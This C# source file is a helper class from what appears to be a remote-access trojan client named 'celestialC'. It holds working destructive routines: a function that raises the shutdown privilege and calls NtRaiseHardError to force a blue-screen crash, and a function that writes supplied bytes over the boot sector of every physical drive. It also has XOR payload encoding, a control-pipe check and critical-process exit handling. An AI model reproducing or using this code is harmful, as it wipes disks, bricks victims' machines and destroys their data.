using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace celestialC.Helper
{
    public static class Methods
    {
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr CreateFile(string lpFileName, FileAccess dwDesiredAccess, FileShare dwShareMode, IntPtr securityAttrs, FileMode dwCreationDisposition, int dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("ntdll.dll")]
        private static extern uint RtlAdjustPrivilege(
    int Privilege,
    bool bEnablePrivilege,
    bool IsThreadPrivilege,
    out bool PreviousValue
);

        [DllImport("ntdll.dll")]
        private static extern uint NtRaiseHardError(
            uint ErrorStatus,
            uint NumberOfParameters,
            uint UnicodeStringParameterMask,
            IntPtr Parameters,
            uint ValidResponseOption,
            out uint Response
        );

        public static void TriggerBSoD()
        {
            RtlAdjustPrivilege(19, true, false, out bool previousValue);
            NtRaiseHardError(0xC0000420, 0, 0, IntPtr.Zero, 6, out uint oul);
        }
        public static void OverwriteBootloader(byte[] bootloaderBytes)
        {
            for (int i = 0; i < 26; i++)
            {
                IntPtr handle = CreateFile("\\\\.\\PHYSICALDRIVE" + i, FileAccess.Write, FileShare.None, IntPtr.Zero, FileMode.Open, 0, IntPtr.Zero);
                if (handle.ToInt32() != -1)
                {
                    uint bytesWritten;
                    WriteFile(handle, bootloaderBytes, (uint)bootloaderBytes.Length, out bytesWritten, IntPtr.Zero);
                    CloseHandle(handle);
                }
            }
        }

        public static byte[] encode(byte[] encBytes)
        {
            char[] key = Settings.passwordvar.ToCharArray();
            byte[] newByte = new byte[encBytes.Length];
            int j = 0;
            for (int i = 0; i < encBytes.Length; i++)
            {
                if (j == key.Length)
                {
                    j = 0;
                }
                newByte[i] = (byte)(encBytes[i] ^ Convert.ToByte(key[j]));
                j++;
            }
            return newByte;
        }

        public static bool isRoot(string pipename = "$CELcnotroler")
        {
            return File.Exists(@"\\.\pipe\" + pipename);
        }
        public static bool IsAdmin()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static void ClientOnExit()
        {
            try
            {
                if (Convert.ToBoolean(Settings.CritProcess) && IsAdmin())
                    ProcessCritical.Exit();
                MutexControl.CloseMutex();
            }
            catch { }
        }
    }
}
